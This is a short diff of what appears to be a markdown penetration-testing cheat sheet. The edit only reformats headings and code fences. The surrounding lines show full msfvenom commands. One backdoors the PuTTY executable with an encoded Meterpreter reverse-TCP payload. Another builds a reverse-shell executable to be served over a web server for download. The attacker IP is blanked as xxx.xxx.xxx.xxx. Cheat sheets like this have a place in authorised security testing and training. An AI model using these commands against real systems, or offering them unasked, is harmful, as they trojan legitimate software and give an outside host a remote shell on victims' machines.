@@ -13,10 +13,9 @@ Backdoor a Windows Feedback Executable
 ```bash
 msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lport= 4444 lhost=xxx.xxx.xxx.xxx -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o puttyX.exe
 ```
-```bash
-
 Generate a Windows Payload then use powershell to download payload 
-------------------------------
+--------------------------------------------------------------------
+```bash
 # Generate payload
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=7777 -f exe > ./reverse3.exe
 # Start Webserver to download
